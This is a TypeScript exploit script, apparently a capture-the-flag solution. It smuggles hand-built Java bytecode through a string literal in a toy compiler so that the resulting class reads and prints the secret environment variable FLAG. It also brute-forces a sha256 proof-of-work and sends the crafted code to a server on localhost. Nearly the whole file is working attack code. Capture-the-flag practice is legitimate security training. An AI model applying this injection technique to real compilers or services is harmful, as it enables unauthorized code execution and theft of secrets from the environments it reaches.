import { compile } from './compiler'
import { writeFile as writeFileAsync } from 'fs'
import { promisify } from 'util'
import { Socket } from './socket'
import { Socket as NativeSocket } from 'net'

import { createHash } from 'crypto'

function sha256(data: string): string {
  const hash = createHash('sha256')
  hash.update(data, 'utf8')
  return hash.digest().toString('hex')
}

const writeFile = promisify(writeFileAsync)
const payload = Buffer.from(
  `\x0c\x00\x13\x00\x15` +
  `\x0a\x00\x06\x00\x1a` +
  `\x0a\x00\x06\x00\x1a` +
  `\x01\x00\x04main` +
  `\x01\x00\x16([Ljava/lang/String;)V` +
  `\x00\x21` +
  `\x00\x02` +
  `\x00\x04` +
  `\x00\x00` +
  `\x00\x00` +
  `\x00\x01` +
  `\x00\x09` +
  `\x00\x1d` +
  `\x00\x1e` +
  `\x00\x01` +
  `\x00\x12` +
  `\x00\x00\x00\x24` + // attr length
  `\x00\x10\x00\x10` +
  `\x00\x00\x00\x18` + // code length
  `\x12\x18` + // ldc "FLAG"
  `\xB2\x00\x0A` + // getstatic System.out
  `\x12\x18` + // ldc "FLAG"
  `\x12\x18` + // ldc "FLAG"
  `\xB8\x00\x1b` + // invokestatic System.getenv
  `\x12\x18` + // ldc "FLAG"
  `\xB6\x00\x10` + // invokevirtual println
  `\x12\x18` + // ldc "FLAG"
  `\xB1` + // return
  `\x00\x00\x00\x00` +
  `\x00\x01` +
  `\x00\x01` +
  `\x00\x00\x01\x00` + '.'.repeat(256 - 141)
)
console.log(payload.byteLength, payload.toString().length)
const wideStr = 'Á'.repeat(payload.toString().length)
const es = wideStr + payload.toString().split('').map(i => '\\x'+i.charCodeAt(0).toString(16).padStart(2, '0')).join('')
const code = `
  let a = 'getenv'
  let b = '(Ljava/lang/String;)Ljava/lang/String;
  let c = 'FLAG'
  print('${es}')
`.trim()
console.log('code', code)
async function main() {
  let out = Buffer.alloc(8192)
  const cls = compile(code)
  const size = cls.write(out)
  out = out.slice(0, size)
  console.log(`Compile complete, size: ${out.byteLength}`)
  await writeFile('Main.class', out)
}

function calcPow(challenge: string) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
  const [, prefix, missing, hash] = /sha256\('(.*?)'\s*\+\s*'(.*?)'\) == '(.*?)'/.exec(challenge)!
  let i = 0
  while (i < Math.pow(chars.length, missing.length)) {
    let [, str] = missing.split('').reduce(([n, s]) => {
      return [n * chars.length, s + chars[Math.floor(i / n) % chars.length]] as [number, string]
    }, [1, ''] as [number, string])
    if (sha256(prefix + str) === hash) {
      return str
    }
    i++
    if (i % 100000 === 0) {
      console.log(str, i, Math.pow(chars.length, missing.length))
    }
  }
  throw new Error('Not found')
}

main().catch(e => console.error(e))

let s = new NativeSocket()
s.connect(5000, 'localhost', async () => {
  const socket = new Socket(s)
  const challenge = await socket.readline()
  console.log('challenge', challenge)
  const resp = calcPow(challenge)
  await socket.writeline(resp)
  await new Promise((resolve) => setTimeout(resolve, 1000))
  console.log('send code')
  for (const line of code.split('\n')) {
    await socket.writeline(line)
    await new Promise((resolve) => setTimeout(resolve, 100))
  }
  await socket.writeline('')
  await socket.writeline('')
  while (true) {
    const line = await socket.readline()
    console.log(line)
  }
})
